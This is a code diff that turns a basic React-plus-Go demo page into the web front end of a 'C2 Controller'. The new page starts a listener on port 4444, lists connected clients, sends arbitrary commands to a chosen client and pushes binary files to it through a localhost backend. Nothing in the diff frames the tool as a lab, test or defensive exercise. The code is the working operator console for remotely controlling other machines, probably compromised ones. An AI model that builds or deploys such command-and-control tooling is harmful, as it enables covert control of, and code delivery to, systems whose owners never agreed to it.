@@ -1,55 +1,192 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>My React + Go App</title>
+    <title>C2 Controller</title>
     <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
     <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #007acc; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin: 5px; }
+        button:hover { background: #005a9e; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        input, select { padding: 8px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; }
+        .status { margin: 10px 0; padding: 10px; border-radius: 4px; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .client-list { list-style: none; padding: 0; }
+        .client-list li { padding: 5px; margin: 2px 0; background: #f8f9fa; border-radius: 3px; }
+    </style>
 </head>
 <body>
     <div id="root"></div>
     
     <script type="text/babel">
         function App() {
-            const [count, setCount] = React.useState(0);
-            const [message, setMessage] = React.useState('');
-            const [loading, setLoading] = React.useState(false);
+            const [status, setStatus] = React.useState('');
+            const [clients, setClients] = React.useState([]);
+            const [selectedClient, setSelectedClient] = React.useState('');
+            const [command, setCommand] = React.useState('');
+            const [selectedFile, setSelectedFile] = React.useState(null);
             
-            // Function to fetch data from Go backend
-            const fetchFromGo = async () => {
-                setLoading(true);
+            const startListener = async () => {
                 try {
-                    const response = await fetch('http://localhost:8080/api/hello');
-                    const data = await response.json();
-                    setMessage(data.text);
+                    const result = await fetch('http://localhost:8080/start-listener', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({})
+                    });
+                    const data = await result.json();
+                    setStatus(data.status);
                 } catch (error) {
-                    setMessage('Failed to connect to Go server');
-                    console.error('Error:', error);
+                    setStatus('Error: ' + error.message);
                 }
-                setLoading(false);
+            };
+            
+            const refreshClients = async () => {
+                try {
+                    const result = await fetch('http://localhost:8080/get-clients');
+                    const data = await result.json();
+                    setClients(data);
+                    if (data.length > 0 && !selectedClient) {
+                        setSelectedClient(data[0]);
+                    }
+                } catch (error) {
+                    console.error('Error fetching clients:', error);
+                }
+            };
+            
+            const sendCommand = async () => {
+                if (!selectedClient || !command) return;
+                
+                try {
+                    const result = await fetch('http://localhost:8080/send-command', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            client: selectedClient,
+                            command: command
+                        })
+                    });
+                    const data = await result.json();
+                    setStatus(data.status);
+                    setCommand('');
+                } catch (error) {
+                    setStatus('Error: ' + error.message);
+                }
+            };
+            
+            const sendBinary = async () => {
+                if (!selectedClient || !selectedFile) return;
+                
+                const formData = new FormData();
+                formData.append('client', selectedClient);
+                formData.append('binaryFile', selectedFile);
+                
+                try {
+                    const result = await fetch('http://localhost:8080/send-binary', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await result.json();
+                    setStatus(data.status);
+                    setSelectedFile(null);
+                    document.getElementById('binary-input').value = '';
+                } catch (error) {
+                    setStatus('Error: ' + error.message);
+                }
+            };
+            
+            const handleFileSelect = (event) => {
+                setSelectedFile(event.target.files[0]);
+            };
+            
+            const getStatusClass = () => {
+                if (status.includes('✅') || status.includes('Listener started')) return 'success';
+                if (status.includes('❌') || status.includes('Error')) return 'error';
+                return '';
             };
             
             return (
-                <div>
-                    <h1>React Frontend + Go Backend</h1>
+                <div className="container">
+                    <h1>🖥️ C2 Controller</h1>
                     
-                    {/* Original counter */}
-                    <div style={{margin: '20px 0', padding: '10px', border: '1px solid #ccc'}}>
-                        <h2>React State Example</h2>
-                        <p>Count: {count}</p>
-                        <button onClick={() => setCount(count + 1)}>
-                            Click me
+                    <div className="section">
+                        <button onClick={startListener}>Start Listener on Port 4444</button>
+                    </div>
+                    
+                    <div className="section">
+                        <button onClick={refreshClients}>Refresh Clients</button>
+                        <h3>Connected Clients:</h3>
+                        {clients.length === 0 ? (
+                            <p>No clients connected</p>
+                        ) : (
+                            <ul className="client-list">
+                                {clients.map(client => (
+                                    <li key={client}>{client}</li>
+                                ))}
+                            </ul>
+                        )}
+                    </div>
+                    
+                    <div className="section">
+                        <h3>📝 Send Command:</h3>
+                        <select 
+                            value={selectedClient} 
+                            onChange={(e) => setSelectedClient(e.target.value)}
+                        >
+                            <option value="">Select Client</option>
+                            {clients.map(client => (
+                                <option key={client} value={client}>{client}</option>
+                            ))}
+                        </select>
+                        <input 
+                            type="text" 
+                            value={command}
+                            onChange={(e) => setCommand(e.target.value)}
+                            placeholder="Enter command"
+                            style={{width: '300px'}}
+                        />
+                        <button onClick={sendCommand} disabled={!selectedClient || !command}>
+                            Send Command
                         </button>
                     </div>
                     
-                    {/* Go API connection */}
-                    <div style={{margin: '20px 0', padding: '10px', border: '1px solid #ccc'}}>
-                        <h2>Go Backend Connection</h2>
-                        <button onClick={fetchFromGo} disabled={loading}>
-                            {loading ? 'Loading...' : 'Fetch from Go Server'}
+                    <div className="section">
+                        <h3>📦 Send Binary File:</h3>
+                        <select 
+                            value={selectedClient} 
+                            onChange={(e) => setSelectedClient(e.target.value)}
+                        >
+                            <option value="">Select Client</option>
+                            {clients.map(client => (
+                                <option key={client} value={client}>{client}</option>
+                            ))}
+                        </select>
+                        <input 
+                            id="binary-input"
+                            type="file" 
+                            accept=".bin" 
+                            onChange={handleFileSelect}
+                        />
+                        <button onClick={sendBinary} disabled={!selectedClient || !selectedFile}>
+                            Send Binary
                         </button>
-                        {message && <p style={{marginTop: '10px'}}>Go says: {message}</p>}
+                        {selectedFile && (
+                            <div style={{marginTop: '10px'}}>
+                                <strong>Selected:</strong> {selectedFile.name} 
+                                ({(selectedFile.size / 1024).toFixed(2)} KB)
+                            </div>
+                        )}
                     </div>
+                    
+                    {status && (
+                        <div className={`status ${getStatusClass()}`}>
+                            <strong>Status:</strong> {status}
+                        </div>
+                    )}
                 </div>
             );
         }
